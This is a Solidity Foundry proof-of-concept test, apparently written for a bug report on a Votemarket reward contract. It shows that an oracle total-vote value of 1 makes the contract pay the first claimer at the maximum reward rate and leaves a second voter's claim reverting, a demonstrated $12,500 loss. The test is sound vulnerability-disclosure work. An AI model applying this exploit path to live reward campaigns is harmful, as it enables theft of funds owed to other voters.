// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "@forge-std/src/Test.sol";
import "src/Votemarket.sol";
import "src/oracle/Oracle.sol";
import "src/oracle/OracleLens.sol";
import "src/utils/StateProofVerifier.sol";

/// @notice Minimal 6-decimal mock USDC-like reward token.
contract MockUSDC {
    string public name = "Mock USDC";
    string public symbol = "mUSDC";
    uint8 public decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

/// @notice PoC B — Votemarket pays rewards at the maxRewardPerVote rate (instead of the
/// fair pro-rata rate) when the Oracle's total votes for an epoch are registered as 1,
/// which happens whenever points_weight[gauge][epoch] was never written on the Curve
/// GaugeController (slot absent at the snapshot block) and setPointData() therefore
/// records bias = 1 ("We add manually 1 wei, to prevent the rollover").
///
/// Scenario (USDC, 6 decimals):
///   - Campaign: $100,000 total, 4 weekly periods -> $25,000 per period.
///   - TRUE total votes for the epoch: 1e22 units -> fair rewardPerVote = 2.5e6.
///   - maxRewardPerVote set to 25e6 (10x the fair rate — a realistic generous cap).
///   - Voter A holds 10% of true votes (1e21): fair epoch payout $2,500.
///   - Voter B holds 50% of true votes (5e21): fair epoch payout $12,500.
///   With totalVotes registered as 1:
///   - Voter A is paid 10x the fair rate ($25,000 gross).
///   - Voter B's claim then REVERTS (campaign budget exhausted) -> B loses $12,500.
///   Demonstrated loss >= $10,000 bar is met by voter B alone.
contract BiasOneLocalTest is Test {
    Votemarket public votemarket;
    Oracle public oracle;
    OracleLens public lens;
    MockUSDC public usdc;

    address public gauge = address(0xAEA6c312f4b3E04D752946d329693F7293bC2e6D);
    address public voterA = address(0xA11CE);
    address public voterB = address(0xB0B);

    uint256 public constant EPOCH = 1795046400; // Thu 2026-11-19 00:00 UTC
    uint256 public constant TOTAL_REWARD = 100_000e6;
    uint256 public constant MAX_RPV = 25e6; // 10x the fair rate 2.5e6
    uint256 public constant TRUE_TOTAL_VOTES = 1e22;

    uint256 public campaignId;

    function setUp() public {
        vm.warp(EPOCH - 1 days); // campaign created during the week before the epoch

        oracle = new Oracle(address(this));
        lens = new OracleLens(address(oracle));
        votemarket =
            new Votemarket(address(this), address(lens), address(this), 1 weeks, 1);

        oracle.setAuthorizedDataProvider(address(this));
        oracle.setAuthorizedBlockNumberProvider(address(this));

        // Register the epoch block (any header with number != 0) and the
        // poisoned point data: total votes = 1 (as setPointData does when the
        // GaugeController slot is absent at the snapshot block).
        oracle.insertBlockNumber(
            EPOCH,
            StateProofVerifier.BlockHeader({
                hash: bytes32(uint256(1)),
                stateRootHash: bytes32(uint256(2)),
                number: 26_446_447,
                timestamp: EPOCH
            })
        );
        oracle.insertPoint(gauge, EPOCH, Oracle.Point({bias: 1, lastUpdate: block.timestamp}));

        // Voter A: 1e21 votes (10% of true total). Voter B: 5e21 (50%).
        // slope * (end - epoch) = votes, with end = epoch + 4 weeks.
        uint256 duration = 4 weeks;
        oracle.insertAddressEpochData(
            voterA,
            gauge,
            EPOCH,
            Oracle.VotedSlope({
                slope: 1e21 / duration,
                end: EPOCH + duration,
                lastVote: EPOCH - 1 weeks,
                lastUpdate: block.timestamp
            })
        );
        oracle.insertAddressEpochData(
            voterB,
            gauge,
            EPOCH,
            Oracle.VotedSlope({
                slope: 5e21 / duration,
                end: EPOCH + duration,
                lastVote: EPOCH - 1 weeks,
                lastUpdate: block.timestamp
            })
        );

        usdc = new MockUSDC();
        usdc.mint(address(this), TOTAL_REWARD);
        usdc.approve(address(votemarket), TOTAL_REWARD);

        address[] memory addrs = new address[](0);
        campaignId = votemarket.createCampaign({
            chainId: 1,
            gauge: gauge,
            manager: address(this),
            rewardToken: address(usdc),
            numberOfPeriods: 4,
            maxRewardPerVote: MAX_RPV,
            totalRewardAmount: TOTAL_REWARD,
            addresses: addrs,
            hook: address(0),
            isWhitelist: false
        });

        vm.warp(EPOCH); // first claimable epoch
    }

    function testTotalVotesIsOne() public view {
        assertEq(lens.getTotalVotes(gauge, EPOCH), 1);
    }

    function testBiasOneOverpaysFirstClaimerAndBricksSecond() public {
        // Fair (honest-oracle) payouts for this epoch:
        uint256 fairRpv = (TOTAL_REWARD / 4) * 1e18 / TRUE_TOTAL_VOTES; // 2.5e6
        uint256 fairGrossA = (1e21 * fairRpv) / 1e18; // $2,500
        uint256 fairGrossB = (5e21 * fairRpv) / 1e18; // $12,500
        assertEq(fairRpv, 2.5e6);
        assertEq(fairGrossA, 2_500e6);
        assertEq(fairGrossB, 12_500e6);

        // Voter A claims first: paid at the MAX rate, 10x the fair rate.
        uint256 claimedA = votemarket.claim(campaignId, voterA, EPOCH, "");
        emit log_named_uint("voterA claimed (net, USDC 6dp)", claimedA);
        emit log_named_uint("voterA fair gross (USDC 6dp)", fairGrossA);
        assertEq(claimedA, 24_000e6); // gross 24_999_999_999 minus 4% fee
        assertEq(votemarket.totalClaimedByCampaignId(campaignId), 24_999_999_999);

        // The period's rewardPerVote is the cap, not the fair rate.
        assertEq(votemarket.getPeriodPerCampaign(campaignId, EPOCH).rewardPerVote, MAX_RPV);

        // Voter B (50% of true votes, fair share $12,500) can no longer claim:
        // the budget is exhausted by the max-rate payout, so the claim reverts
        // and B's whole epoch reward is lost.
        vm.expectRevert(Votemarket.CLAIM_AMOUNT_EXCEEDS_REWARD_AMOUNT.selector);
        votemarket.claim(campaignId, voterB, EPOCH, "");

        assertEq(usdc.balanceOf(voterB), 0);
        emit log_named_uint("voterB fair gross LOST (USDC 6dp)", fairGrossB);
        assertGe(fairGrossB, 10_000e6); // >= $10,000 demonstrated-loss bar
    }
}
